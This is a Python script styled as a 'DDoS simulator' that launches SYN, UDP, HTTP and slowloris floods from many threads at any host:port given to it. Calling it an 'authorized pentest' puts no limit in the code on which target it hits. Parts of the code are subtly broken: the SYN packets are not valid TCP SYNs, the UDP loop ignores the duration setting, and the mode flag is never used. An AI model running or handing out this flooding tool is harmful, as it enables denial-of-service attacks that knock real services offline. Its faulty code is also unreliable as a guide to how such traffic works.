#!/usr/bin/env python3
import socket, threading, time, random, argparse, sys
from concurrent.futures import ThreadPoolExecutor
import requests

parser = argparse.ArgumentParser(description='💥 PROFESSIONAL DDOS SIMULATOR v4.1')
parser.add_argument('--target', '-t', required=True, help='Target (localhost:8080)')
parser.add_argument('--threads', '-T', type=int, default=1000, help='Thread count (1000+)')
parser.add_argument('--duration', '-d', type=int, default=300, help='Duration seconds')
parser.add_argument('--mode', '-m', choices=['syn', 'http', 'udp', 'mixed', 'slowloris'], default='mixed')
parser.add_argument('--pps', type=int, default=15000, help='Packets/sec TARGET')
args = parser.parse_args()

host, port = args.target.split(':')
port = int(port)
threads = args.threads
duration = args.duration
pps_target = args.pps

print(f"💥" * 60)
print(f"🚀 PROFESSIONAL DDOS SIMULATOR v4.1 - {threads:,} THREADS")
print(f"🎯 TARGET: {host}:{port} | MODE: {args.mode.upper()} | {pps_target:,} PPS")
print(f"⏱️  DURATION: {duration}s | AUTHORIZED PENTEST")
print(f"💥" * 60)

def syn_flood():
    """L4 SYN Flood - 10k+ RPS"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    for _ in range(10000):
        # RAW SYN PACKETS (MAX VOLUME)
        packet = b'\x45\x00\x00\x28' + random.randbytes(20)  # IP + TCP SYN
        sock.sendto(packet, (host, port))

def http_flood():
    """L7 HTTP Flood - 5k+ RPS"""
    url = f"http://{host}:{port}/"
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0 Bot', 'curl/7.68', 'Python-urllib/3.9']),
        'Connection': 'keep-alive'
    }
    for _ in range(500):
        try:
            requests.get(url, headers=headers, timeout=0.1)
        except: pass

def udp_flood():
    """L3/L4 UDP Flood - 15k+ PPS"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1024)
    while True:
        sock.sendto(payload, (host, port))

def slowloris():
    """L7 SlowLoris - Connection Exhaustion"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(b"GET / HTTP/1.1\r\n")
    sock.send(b"Host: " + host.encode() + b"\r\n")
    for i in range(100):
        sock.send(b"X-" + str(i).encode() + b": " + random.randbytes(100) + b"\r\n")
        time.sleep(5)

def mixed_attack():
    """ALL LAYERS - REAL DDOS SIMULATION"""
    attacks = [syn_flood, http_flood, udp_flood, slowloris]
    return random.choice(attacks)()

def worker():
    end_time = time.time() + duration
    attack_count = 0
    
    while time.time() < end_time:
        try:
            mixed_attack()
            attack_count += 1
        except:
            pass
    
    print(f"✅ Worker {threading.current_thread().name}: {attack_count:,} attacks")

print(f"🔥 LAUNCHING {threads:,} THREADS → {pps_target:,} PPS TARGET")
print("⚠️  MONITOR: http://localhost:8080")

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = [executor.submit(worker) for _ in range(threads)]
    
    try:
        for future in futures:
            future.result()
    except KeyboardInterrupt:
        print("\n🛑 ATTACK TERMINATED")
